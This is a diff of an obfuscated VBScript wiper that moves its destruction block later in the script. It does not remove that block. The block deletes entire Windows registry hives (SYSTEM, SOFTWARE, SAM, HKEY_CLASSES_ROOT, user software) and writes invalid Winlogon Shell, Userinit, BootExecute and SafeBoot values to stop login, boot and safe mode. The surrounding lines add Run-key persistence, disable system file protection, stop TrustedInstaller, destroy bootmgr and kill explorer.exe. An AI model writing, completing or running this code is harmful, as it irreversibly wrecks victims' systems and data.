@@ -12,21 +12,7 @@ x7p9q.Run "cmd.exe /c '" & f & "'", 0, False
 On Error Resume Next
 k9m2v.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSys", f, "REG_SZ"
 x7p9q.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v SFCDisable /t REG_DWORD /d 1 /f", 0, True
-x7p9q.Run "reg delete HKLM\SYSTEM\CurrentControlSet\Services /f", 0, True ' Kill services
-x7p9q.Run "reg delete HKLM\SYSTEM\MountedDevices /f", 0, True ' Screw disk mappings
-x7p9q.Run "reg delete HKLM\SYSTEM\Setup /f", 0, True ' Setup fucked
-x7p9q.Run "reg delete HKLM\SYSTEM\config /f", 0, True ' Registry backups
-x7p9q.Run "reg delete HKLM\SAM /f", 0, True ' Login accounts fucked
-x7p9q.Run "reg delete HKLM\SOFTWARE\Policies /f", 0, True ' Policies erased
-x7p9q.Run "reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f", 0, True ' No startup apps
-x7p9q.Run "reg delete HKLM\SOFTWARE /f", 0, True ' Software hive gone
-x7p9q.Run "reg delete HKLM\SYSTEM /f", 0, True ' Entire SYSTEM hive
-x7p9q.Run "reg delete HKCU\Software /f", 0, True ' User configs dead
-x7p9q.Run "reg delete HKEY_CLASSES_ROOT /f", 0, True ' File associations gone
-k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "invalid.exe", "REG_SZ" ' Login fails
-k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit", "C:\invalid\userinit.exe", "REG_SZ" ' No user init
-k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "invalid_command", "REG_MULTI_SZ" ' Break boot
-k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD" ' No safe mode
+
 x7p9q.Run "net stop TrustedInstaller /y", 0, True
 If Not q3z8k.FolderExists("C:\Temp") Then q3z8k.CreateFolder("C:\Temp")
 
@@ -184,6 +170,22 @@ If q3z8k.FileExists("C:\bootmgr") Then
     x7p9q.Run "echo " & String(1000000, "X") & " > C:\bootmgr", 0, True 
     x7p9q.Run "del /f /q C:\bootmgr", 0, True
 End If
+
+x7p9q.Run "reg delete HKLM\SYSTEM\CurrentControlSet\Services /f", 0, True ' Kill services
+x7p9q.Run "reg delete HKLM\SYSTEM\MountedDevices /f", 0, True ' Screw disk mappings
+x7p9q.Run "reg delete HKLM\SYSTEM\Setup /f", 0, True ' Setup fucked
+x7p9q.Run "reg delete HKLM\SYSTEM\config /f", 0, True ' Registry backups
+x7p9q.Run "reg delete HKLM\SAM /f", 0, True ' Login accounts fucked
+x7p9q.Run "reg delete HKLM\SOFTWARE\Policies /f", 0, True ' Policies erased
+x7p9q.Run "reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f", 0, True ' No startup apps
+x7p9q.Run "reg delete HKLM\SOFTWARE /f", 0, True ' Software hive gone
+x7p9q.Run "reg delete HKLM\SYSTEM /f", 0, True ' Entire SYSTEM hive
+x7p9q.Run "reg delete HKCU\Software /f", 0, True ' User configs dead
+x7p9q.Run "reg delete HKEY_CLASSES_ROOT /f", 0, True ' File associations gone
+k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "invalid.exe", "REG_SZ" ' Login fails
+k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit", "C:\invalid\userinit.exe", "REG_SZ" ' No user init
+k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "invalid_command", "REG_MULTI_SZ" ' Break boot
+k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD" ' No safe mode
 
 ' kill critical processes
 x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
